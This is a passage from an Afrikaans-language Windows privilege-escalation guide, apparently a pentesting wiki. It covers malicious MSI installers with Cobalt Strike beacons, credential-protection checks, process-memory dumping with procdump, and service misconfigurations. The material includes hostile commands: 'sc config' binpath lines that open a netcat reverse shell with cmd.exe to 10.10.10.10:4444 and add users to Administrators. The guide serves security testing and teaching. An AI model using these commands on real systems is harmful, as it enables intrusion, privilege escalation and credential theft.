As jy ’n Meterpreter-sessie het, kan jy hierdie tegniek outomatiseer met die module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Gebruik die `Write-UserAddMSI`-opdrag van PowerUP om in die huidige gids ’n Windows MSI-binêre lêer te skep om voorregte te eskaleer. Hierdie script skryf ’n vooraf saamgestelde MSI-installeerder uit wat vra dat ’n gebruiker/groep bygevoeg word (jy sal dus GIU-toegang nodig hê):

```
Write-UserAddMSI
```

Voer net die geskepte binary uit om voorregte te eskaleer.

### MSI Wrapper

Lees hierdie tutoriaal om te leer hoe om ’n MSI-wrapper met hierdie tools te skep. Let daarop dat jy ’n "**.bat**"-lêer kan omhul as jy **net** **command lines** wil **uitvoer**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Genereer** met Cobalt Strike of Metasploit ’n **nuwe Windows EXE TCP-payload** in `C:\privesc\beacon.exe`
- Maak **Visual Studio** oop, kies **Create a new project** en tik "installer" in die soekkassie. Kies die **Setup Wizard**-projek en klik **Next**.
- Gee die projek ’n naam, soos **AlwaysPrivesc**, gebruik **`C:\privesc`** as die ligging, kies **place solution and project in the same directory**, en klik **Create**.
- Hou aan om **Next** te klik totdat jy by stap 3 van 4 kom (kies lêers om in te sluit). Klik **Add** en kies die Beacon-payload wat jy pas gegenereer het. Klik dan **Finish**.
- Merk die **AlwaysPrivesc**-projek in die **Solution Explorer** en verander in **Properties** **TargetPlatform** van **x86** na **x64**.
  - Daar is ander eienskappe wat jy kan verander, soos **Author** en **Manufacturer**, wat die geïnstalleerde toepassing meer wettig kan laat lyk.
- Regsklik op die projek en kies **View > Custom Actions**.
- Regsklik op **Install** en kies **Add Custom Action**.
- Dubbelklik **Application Folder**, kies jou **beacon.exe**-lêer en klik **OK**. Dit verseker dat die beacon-payload uitgevoer word sodra die installeringsprogram begin word.
- Verander onder **Custom Action Properties** **Run64Bit** na **True**.
- Laastens, **bou dit**.
  - As die waarskuwing `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` verskyn, maak seker dat jy die platform op x64 gestel het.

### MSI Installation

Om die **installation** van die kwaadwillige `.msi`-lêer **in die agtergrond** uit te voer:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Om hierdie kwesbaarheid uit te buit, kan jy gebruik maak van: _exploit/windows/local/always_install_elevated_

## Antivirus en Detektors

### Ouditinstellings

Hierdie instellings bepaal wat **aangeteken** word, daarom moet jy aandag daaraan skenk.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: dit is interessant om te weet waarheen die logs gestuur word.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** is ontwerp vir die **bestuur van plaaslike Administrator-wagwoorde**, en verseker dat elke wagwoord **uniek, ewekansig en gereeld opgedateer** word op rekenaars wat by ’n domein aangesluit is. Hierdie wagwoorde word veilig in Active Directory gestoor en is slegs toeganklik vir gebruikers aan wie voldoende toestemmings deur ACLs toegeken is, sodat hulle plaaslike admin-wagwoorde kan sien indien hulle gemagtig is.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Indien dit aktief is, **word wagwoorde in gewone teks in LSASS gestoor** (Local Security Authority Subsystem Service).\
[**Meer inligting oor WDigest op hierdie bladsy**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Vanaf **Windows 8.1** het Microsoft verbeterde beskerming vir die Local Security Authority (LSA) bekendgestel om pogings deur onbetroubare prosesse om **sy geheue te lees** of kode in te spuit te **blokkeer**, en sodoende die stelsel verder te beveilig.\
[**Meer inligting oor LSA Protection hier**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** is in **Windows 10** bekendgestel. Die doel daarvan is om credentials wat op ’n toestel gestoor is, te beskerm teen bedreigings soos pass-the-hash attacks. [**Meer inligting oor Credential Guard is hier beskikbaar.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Gekasde aanmeldbewyse

**Domeinaanmeldbewyse** word deur die **Local Security Authority** (LSA) geverifieer en deur bedryfstelselkomponente gebruik. Wanneer ’n geregistreerde sekuriteitspakket ’n gebruiker se aanmelddata verifieer, word domeinaanmeldbewyse vir die gebruiker gewoonlik opgestel.\
[**Meer inligting oor gekasde aanmeldbewyse hier**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Gebruikers en groepe

### Lys gebruikers en groepe

Jy moet nagaan of enige van die groepe waaraan jy behoort interessante toestemmings het.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Bevoorregte groepe

As jy **aan ’n bevoorregte groep behoort, kan jy moontlik voorregte eskaleer**. Lees hier meer oor bevoorregte groepe en hoe om hulle te misbruik om voorregte te eskaleer:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Lees meer** oor wat ’n **token** is op hierdie bladsy: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Besoek die volgende bladsy om **meer te leer oor interessante tokens** en hoe om hulle te misbruik:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Aangemelde gebruikers / Sessies

```bash
qwinsta
klist sessions
```

### Tuisvouers

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Wagwoordbeleid

```bash
net accounts
```

### Kry die inhoud van die knipbord

```bash
powershell -command "Get-Clipboard"
```

## Lopende prosesse

### Lêer- en vouertoestemmings

In die eerste plek, wanneer jy die prosesse lys, **kyk vir wagwoorde in die opdragreël van die proses**.\
Kyk of jy **’n lopende binary kan oorskryf**, of skryftoestemmings vir die binary se vouer het om moontlike [**DLL Hijacking attacks**](dll-hijacking/index.html) uit te buit:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Kyk altyd of moontlike [**electron/cef/chromium debuggers**] aan die loop is; jy kan dit misbruik om voorregte te eskaleer](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

’n Debugger-listener kan kortstondig wees, dus bewys die afwesigheid daarvan in een passiewe poortmomentopname nie dat dit nooit blootgestel was nie. Koppel enige waargenome listener aan sy PID, proseseienaar en die laerbevoorregte gebruiker se vermoë om dit te bereik; ’n programnaam of debug-vlag op sigself bewys nie cross-user code execution nie. Hou roetine-enumerasie passief eerder as om debugger-opdragte te stuur.

**Kontroleer die toestemmings van die prosesse se binaries**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Kontroleer toestemmings van die vouers van die proses se binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor-gidse

Snort 2 kan gedeelde biblioteke laai vanaf ’n `dynamicpreprocessor directory` wat verklaar is in die konfigurasie wat met `snort.exe -c <config>` gekies is. Vir ’n geskeduleerde taak of diens wat Snort onder ’n ander rekening uitvoer, ondersoek daardie presiese konfigurasie en die ACL van die verklaarde modulegids. As jou token daar lêers kan skep, is die pad ’n kandidaat vir ondersoek na kode-uitvoering wanneer daardie taak of diens modules volgende keer laai. Bevestig die uitvoerrekening se effektiewe regte, die aktiewe konfigurasie, moduleversoenbaarheid en enige weierings- of deelbeperkings; ’n skryfbare gids op sigself bewys nie privilege escalation nie. [Snort se dokumentasie oor dynamic preprocessor](https://www.snort.org/documents/dpx-readme) beskryf die laai van modules tydens looptyd.

### Bevoorregte webdiens met ’n skryfbare dokumentwortel

Op ’n Windows Apache-installasie, vergelyk die diens se uitvoerbare pad en uitvoerrekening met die `DocumentRoot` in die aktiewe `httpd.conf`. Vir ’n konvensionele XAMPP-uitleg, ondersoek `C:\xampp\apache\conf\httpd.conf` en die ACL op die gekonfigureerde dokumentwortel, dikwels `C:\xampp\htdocs`. As ’n gebruiker met minder regte lêers in daardie wortel kan skep terwyl Apache as `LocalSystem` loop, kan kode-uitvoering aan die bedienerkant die gasheer se privilege boundary oorsteek. Bevestig dat die diens loop, dat die presiese pad bedien word en dat ’n bedienerkant-hanteerder die lêertipe verwerk; ’n skryfbare wortel bewys op sigself net dat lêers geskep kan word. Ondersoek ACL’s sonder om ’n toetslêer te skryf:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Vir ’n konvensionele WAMP-installasie kan die diens na ’n weergawespesifieke `C:\wamp64\bin\apache\apache*\bin\httpd.exe` verwys (of `C:\wamp\...` vir ’n 32-bis-uitleg), met die konfigurasie langsaan onder `conf\httpd.conf` en ’n verstekwortel van `C:\wamp64\www` of `C:\wamp\www`. Kontroleer die presiese diensbeeld, die identiteit waaronder dit loop, die effektiewe `DocumentRoot` (insluitend uitbreiding van `${INSTALL_DIR}` en virtuele gasheer-oorheersings) en die wortel se ACL saam. ’n Skryfbare WAMP-gids bewys nie dat Apache as `SYSTEM` loop of die ingediende lêer uitvoer nie. [Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Skryfbare IIS-wortel en application-pool-netwerkidentiteit

Koppel vir IIS ’n skryfbare fisiese gids aan ’n **aktiewe werf/toepassing** in `applicationHost.config`, en bepaal dan die geconfigureerde pool en bedienerkant-hanteerder. Kode wat in ’n bediende gids geplaas word, loop slegs as die pool as IIS daardie lêertipe verwerk en die roete bereikbaar is. Kontroleer die huidige gebruiker se effektiewe toestemming om lêers te skep, die werf se looptydstatus, die hanteerder en oorheersings per pad voordat jy ’n skryfbare gids as kode-uitvoering beskou.

ASP.NET-dinamiese samestelling bied ’n afsonderlike pad om te ondersoek: gegenereerde lêers in die toepassing se samestellingsgids. Die verstek is ’n `Temporary ASP.NET Files`-gids onder die betrokke .NET Framework-installasie, maar die toepassing se `<compilation tempDirectory>` kan dit verander. [Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) en [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). As ’n laerbevoorregte token gegenereerde bronkode in die kas van die **spesifieke** toepassing kan verander, bepaal of daardie toepassing dit weer saamstel onder ’n meer bevoorregte [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). ’n Lêer- of gids-ACL alleen bewys nie kode-uitvoering nie: koppel die kas aan die aktiewe toepassing, effektiewe token en ACL, samestellingsinstellings, prosesidentiteit en die tydstip van enige hersamestelling. Gebruik ’n alleen-lees-oorsig van metadata; moenie samestelling aktiveer of kaslêers verander tydens enumerasie nie.

’n IIS-pool wat as `ApplicationPoolIdentity` of `NetworkService` geconfigureer is, staaf hom gewoonlik by domeinhulpbronne as die **gasheerrekenaarrekening**, al kan sy plaaslike token lae voorregte hê. `LocalSystem` is reeds plaaslik hoogs bevoorreg en gebruik ook die rekenaarrekening op die netwerk; `LocalService` bied gewoonlik anonieme netwerkbewyse aan. ’n `SpecificUser`-pool gebruik eerder die geconfigureerde rekening. [Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) en [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). ’n Weggelate identiteitsinstelling kan die pool se verstekwaardes erf, wat tussen IIS-generasies verskil; bepaal dus die effektiewe konfigurasie eerder as om op grond van die poolnaam te raai. As kode-uitvoering ’n pool met ’n rekenaarrekening as netwerkidentiteit bereik, beoordeel die **spesifieke rekenaar** se regte in die gids. [DCSync](../active-directory-methodology/dcsync.md) vereis replikasieregte op die domeinnaamkonteks; ’n masjienrekeningkaartjie of gasheerrol alleen bewys dit nie. Passiewe enumerasie moet konfigurasie en ACL’s nagaan sonder om ’n lêer op te laai, netwerkstawing te doen of kaartjies aan te vra.

Vir ’n leesbare ASP.NET-hanteerder wat ’n hulpproses begin, volg enige versoekafgeleide waarde deur stawing, dekripsie, validering en opdragkonstruksie. ’n Hanteerder wat ’n gedekodeerde token aan `ProcessStartInfo("cmd", "/c ...")` aaneenlas, kan dalk toelaat dat dopmetatekens die opdrag verander; [Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Stel vas dat ’n onbetroubare oproeper die gedekodeerde waarde werklik kan beïnvloed en die hanteerder kan bereik, en bepaal dan die effektiewe application-pool- of nagebootste identiteit en die kindproses se identiteit. ’n Leesbare bronkoderël, ’n luisteraar op localhost of ’n swakheid in die tokenformaat bewys op sigself nie bevoorregte opdraguitvoering nie. Ondersoek bronkode en poolkonfigurasie sonder om vervalste versoeke te stuur of die hulpproses tydens passiewe enumerasie uit te voer.

Vir ’n PHP-diens op Windows kan ’n versoekbeheerde pad wat aan [`include` or `require`](https://www.php.net/manual/en/function.include.php) deurgegee word, ’n PHP-lêer wat deur ’n laer gebruiker geskryf kan word, onder die werker se identiteit evalueer. Bevestig dat die versoek daardie stelling kan bereik, dat die opgeloste pad ’n lêer aandui wat die laer gebruiker kan verander en die werker kan lees, dat toepaslike PHP-padbeperkings die insluiting toelaat, en dat die werker werklik met hoër voorregte loop. ’n Teruglusluisteraar of skryfbare lêer alleen bewys nie hierdie ketting nie; ondersoek die bronkode, diensidentiteit en lêer-ACL’s sonder om die eindpunt tydens passiewe enumerasie aan te roep.

### Wagwoordontginning uit geheue

Jy kan **procdump** van Sysinternals gebruik om ’n geheuestorting van ’n lopende proses te maak. Dienste soos FTP het die **aanmeldbewyse in gewone teks in die geheue**; probeer om die geheue te stort en die aanmeldbewyse te lees.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Onveilige GUI-programme

**Toepassings wat as SYSTEM loop, kan ’n gebruiker dalk toelaat om ’n CMD te begin of deur gidse te blaai.**

Voorbeeld: "Windows Help and Support" (Windows + F1), soek vir "command prompt", klik op "Click to open Command Prompt"

### Bevoorregte invoer van projeklêers

’n Toepassing wat outomaties projekte uit ’n skryfbare aflaaigids vir ’n laer gebruiker oopmaak, steek ’n vertrouensgrens vir invoer oor onder die invoerder se rekening. Gaan die **presiese skryfbare pad**, die proses of taak wat dit oopmaak, sy effektiewe identiteit en die parser-bouweergawe na. ’n [Historiese probleem met die oopmaak/herstel van Ghidra-projekte](https://github.com/NationalSecurityAgency/ghidra/issues/71) het XML-eksterne entiteite in projekmetadata toegelaat; ’n netwerkentiteit op Windows kon verifikasie vanaf die invoerende rekening veroorsaak indien [uitgaande SMB- en NTLM-beleid](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) dit toelaat. Dit is ’n leidraad vir blootstelling van geloofsbriewe, nie onmiddellike administrateurtoegang nie: die reaksie moet via ’n afsonderlike gemagtigde of kwesbare pad benut kan word, en huidige bouweergawes moet aan hul werklike pleisterstatus getoets word. Moenie ’n vervaardigde projek tydens passiewe enumerasie oopmaak nie; ondersoek die invoerwerkvloei en ACL’s.

## Dienste

Die [`SC_MANAGER_CREATE_SERVICE`-reg van die Service Control Manager (SCM)-objek](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) is apart van regte op ’n bestaande diens. ’n Suksesvolle leesalleen [`OpenSCManager`-toegangsversoek](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) vir daardie reg is ’n ondersoekleidraad, nie bewys dat ’n nuwe diens kan loop nie. [`CreateService` gee ’n handvatsel terug](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) met die dienstoegang wat tydens skepping aangevra is; wanneer die diens later weer oopgemaak word, vind ’n aparte toegangstoets plaas, wat kan misluk selfs wanneer die oorspronklike handvatsel gebruik kon word. Verifieer die effektiewe plaaslike of afgeleë token, toegekende handvatselregte, diensrekening, beginbeleid en uitvoerbare pad afsonderlik. Moenie ’n diens skep of begin tydens passiewe enumerasie nie.

Vir ’n afgeleë diensinstallasiepad, korreleer daardie SCM-regte met ’n deelhulpbron op die teiken waarop dieselfde netwerk-aanmelding kan skryf, die onderliggende NTFS-ACL en ’n plaaslike uitvoerbare pad wat die diensrekening kan laat loop. ’n Nie-admin-rekening kan hierdie grens oorsteek indien buitengewoon ruim SCM-regte én die lêerplasingpad bestaan; ’n administratiewe deelhulpbron is nie ’n inherente vereiste nie. Skryftoegang tot ’n deelhulpbron alleen, of ’n SCM-leidraad vir diensskepping alleen, bewys nie dat die nuwe diens onder ’n hoër identiteit kan begin nie.

’n Bestaande diens kan tydens opstart, afskakeling of ’n ander lewensiklusgebeurtenis ’n hulpprogram uitvoer, selfs wanneer dié hulpprogram nie in sy `ImagePath` voorkom nie. As die hulpprogramnaam na ’n gids opgelos word waarop ’n laer gebruiker kan skryf, en die diens onder ’n hoër identiteit loop, kan ’n ontbrekende hulpprogramlêer ’n voorwaardelike vervangingskandidaat wees. Bevestig die **werklike dienskode of gedokumenteerde aanroep van die hulpprogram**, die opgeloste uitvoerbare pad en soekvolgorde, regte om die gids te skep, diensidentiteit en ’n beskikbare lewensiklustrigger. ’n Skryfbare diensgids of ’n ontbrekende lêer alleen bewys nie dat die diens die lêer laai nie; passiewe ondersoek moet nie die diens begin of stop nie.

Vir ’n bestaande diens laat [`SERVICE_START` toe dat argumente aan `StartService` verskaf word](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); dit verskil van [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Gaan die dienskode of gedokumenteerde koppelvlak na voordat begintoegang as meer as ’n beheertoegangsreg beskou word. As dit ’n argument wat deur die aanroeper gekies is as ’n log- of uitvoerpad gebruik, verifieer die diensidentiteit, die presiese vloei van argument na skryfbewerking, padbeperkings en die toestemmings op die **geskepte lêer**. ’n Skryfbewerking na ’n beskermde gids kan slegs eskalasie moontlik maak as daar ’n afsonderlike bevoorregte verbruiker of laaier is wat daardie lêer aanvaar; ’n skryfbare log of begintoegangsreg alleen is onvoldoende. Passiewe inventarisering moet nie die diens begin of ’n toetslêer skep nie.

Vir ’n NSClient++-moniteringsagent is ’n leesbare `nsclient.ini` ’n **leidraad vir konfigurasie-ondersoek**: dit kan webgeloofsbriewe bevat, terwyl `boot.ini` die konfigurasie na ’n ander ligging kan herlei. Gaan die werklike diensrekening, WEB-luisteraar en toegangsbeleid na, asook of die geverifieerde rol instellings of skrifte kan verander. Bevoorregte uitvoering vereis boonop `CheckExternalScripts` (of ’n ander geaktiveerde uitvoeringspad), ’n effektiewe reg om ’n opdrag te registreer of te wysig, en ’n sneller wat dit onder die diensidentiteit laat loop. ’n Luisteraar wat slegs op loopback beskikbaar is, kan steeds vir ’n plaaslike gebruiker bereikbaar wees, maar die lêerpad, wagwoord of luisteraar alleen bewys nie dat daardie regte bestaan nie. Gaan metadata en toestemmings na sonder om geheime te vertoon of die web-API tydens passiewe enumerasie aan te roep. Sien die [NSClient++-lêeruitleg](https://nsclient.org/docs/concepts/file-layout/), [sekuriteitsriglyne vir web en skrifte](https://nsclient.org/docs/setup/securing/) en [konfigurasie van eksterne skrifte](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Vir ’n diens waarvan `ImagePath` `nssm.exe` is, ondersoek die diens se werklike loop-as-rekening en die waarde `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM stoor die kindtoepassing daar](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), terwyl `AppDirectory` die gekonfigureerde werkgids is. Gaan die kind-uitvoerbare lêer en die ACL’s van sy ouergids na voordat jy die regte van die omhulsel as die hele diensgrens beskou. ’n Plaaslike WCF- of SOAP-eindpunt wat deur daardie kind blootgestel word, is ’n afsonderlike ondersoekleidraad: bevestig dat die eindpunt vir die laerbevoorregte gebruiker bereikbaar is, dat die presiese bewerking hul invoer aanvaar en dat die dienskind die onveilige bewerking onder ’n hoër identiteit uitvoer. Die diensrekening, ’n eindpunt-URL of ’n skryfbare pad alleen bewys nie eskalasie nie; vermy dit om diensbewerkings tydens passiewe enumerasie aan te roep.

Vir ’n pasgemaakte WCF-bewerking, volg ’n string wat deur die aanroeper beheer word tot in enige PowerShell-runspace. [`Pipeline.Commands.AddScript voeg skrifteks by`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), en [`Pipeline.Invoke voer die pyplyn uit`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). ’n [`netTcpBinding` met Windows-vervoergeloofsbriewe](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) verifieer die kliënt, maar magtiging om daardie **spesifieke** bewerking aan te roep en die runspace se effektiewe identiteit moet afsonderlik nagegaan word. ’n Pad vanaf invoer van ’n laerbevoorregte aanroeper na `AddScript` onder ’n hoër diensidentiteit is ’n kode-uitvoeringsgrens; ’n luisterpoort, geverifieerde kliënt of ongebruikte metode in ’n onverwante assembly is alleen nie bewys nie. Ondersoek die ontplooide diens, kontrak, magtiging en nabootsingsinstellings staties sonder om die eindpunt tydens enumerasie aan te roep.

Dienssnellers laat Windows toe om ’n diens te begin wanneer sekere toestande plaasvind (genoemde-pyp/RPC-eindpuntaktiwiteit, ETW-gebeurtenisse, beskikbaarheid van IP, toestel wat aansluit, GPO-verversing, ens.). Selfs sonder SERVICE_START-regte kan jy dikwels bevoorregte dienste begin deur hul snellers te aktiveer. Sien enumerasie- en aktiveringstegnieke hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio-diagnostiese versamelingsdiens

Visual Studio-installasies met C/C++-nutsgoed kan `VSStandardCollectorService150` insluit, ’n diagnostiese diens wat ingestel is om as `LocalSystem` te loop. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) het ’n junction- en object-manager-link-rasetoestand gebruik om ’n diens-DACL-terugstelling te herlei. Die gedemonstreerde eskalasie het ook ’n bruikbare MSI-herstelpad deur die Visual Studio Setup WMI Provider en sy teiken `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` vereis. Die komponent is in Januarie 2024 reggestel.

Vir passiewe triage, ondersoek daardie enkele diens se rekening en binêre pad, kyk of die Setup WMI-kompilatorpad bestaan en verifieer die geïnstalleerde komponent se pleisterstatus. ’n Diensinskrywing, Visual Studio-produkweergawe of kompilatorlêer alleen bewys nie dat die gasheer kwesbaar is nie. Die diens hoef nie begin te word of ’n herstelbewerking uitgevoer te word om dit te ondersoek nie.

Kry ’n lys dienste:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Toestemmings

Jy kan **sc** gebruik om inligting oor ’n diens te kry.

```bash
sc qc <service_name>
```

Dit word aanbeveel om die binary **accesschk** van _Sysinternals_ te hê om die vereiste voorregvlak vir elke diens na te gaan.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Dit word aanbeveel om te kyk of "Authenticated Users" enige diens kan wysig:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Jy kan accesschk.exe vir XP hier aflaai](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Aktiveer diens

As jy hierdie fout kry (byvoorbeeld met SSDPSRV):

_Stelselfout 1058 het voorgekom._\
_Die diens kan nie begin word nie, omdat dit gedeaktiveer is of omdat daar geen geaktiveerde toestelle daaraan gekoppel is nie._

Jy kan dit aktiveer met

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Neem in ag dat die diens upnphost van SSDPSRV afhanklik is om te werk (vir XP SP1)**

**Nog ’n tydelike oplossing** vir hierdie probleem is om die volgende uit te voer:

```
sc.exe config usosvc start= auto
```

### **Wysig diens se binêre pad**

In die scenario waar die groep "Authenticated users" **SERVICE_ALL_ACCESS** op ’n diens het, is dit moontlik om die diens se uitvoerbare binêre lêer te wysig. Om **sc** te wysig en uit te voer:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Herbegin diens

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Voorregte kan deur verskeie toestemmings verhoog word:

- **SERVICE_CHANGE_CONFIG**: Laat herkonfigurasie van die diensbinêre lêer toe.
- **WRITE_DAC**: Maak herkonfigurasie van toestemmings moontlik, wat die vermoë bied om dienskonfigurasies te verander.
- **WRITE_OWNER**: Maak dit moontlik om eienaarskap te verkry en toestemmings te herkonfigureer.
- **GENERIC_WRITE**: Erf die vermoë om dienskonfigurasies te verander.
- **GENERIC_ALL**: Erf ook die vermoë om dienskonfigurasies te verander.

Vir die opsporing en uitbuiting van hierdie kwesbaarheid kan _exploit/windows/local/service_permissions_ gebruik word.

### Diensbinêre lêers met swak toestemmings

As ’n diens as **`LocalSystem`**, **`LocalService`**, **`NetworkService`** of ’n bevoorregte domeinrekening loop, maar **gebruikers met lae voorregte die diens se EXE of sy ouerlêergids kan wysig**, kan die diens dikwels gekaap word deur **die binêre lêer te vervang en die diens te herbegin**.

**Kyk of jy die binêre lêer kan wysig wat deur ’n diens uitgevoer word**, of of jy **skryftoestemmings op die lêergids** het waarin die binêre lêer geleë is ([**DLL Hijacking**](dll-hijacking/index.html)**.**\
Jy kan elke binêre lêer wat deur ’n diens uitgevoer word met **wmic** (nie in system32 nie) kry en jou toestemmings met **icacls** nagaan:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Jy kan ook **sc** en **icacls** gebruik:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Soek na gevaarlike ACL's wat aan **`Everyone`**, **`BUILTIN\Users`** of **`Authenticated Users`** toegeken is, veral **`(F)`**, **`(M)`** of **`(W)`** op die diens se uitvoerbare lêer of die gids wat dit bevat. 'n Praktiese misbruikvloei is:<sup>[[27]](#references)</sup>

1. Bevestig die diensrekening en pad na die uitvoerbare lêer met `sc qc <service_name>`.
2. Bevestig dat die binêre lêer skryfbaar is met `icacls <path>`.
3. Vervang die diens se binêre lêer met 'n payload of 'n geldige kwaadwillige diensbinêre lêer.
4. Herbegin die diens met `sc stop <service_name> && sc start <service_name>` (of wag vir 'n herlaai / dienssneller).

Nuttige outomatiese kontroles:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> As die diens nie ’n gewone gebruiker toelaat om dit te herbegin nie, kyk of dit outomaties tydens opstart begin, ’n mislukkingsaksie het wat dit herbegin, of indirek deur die toepassing wat dit gebruik, geaktiveer kan word.

### Wysigtoestemmings vir diensregisterinskrywings

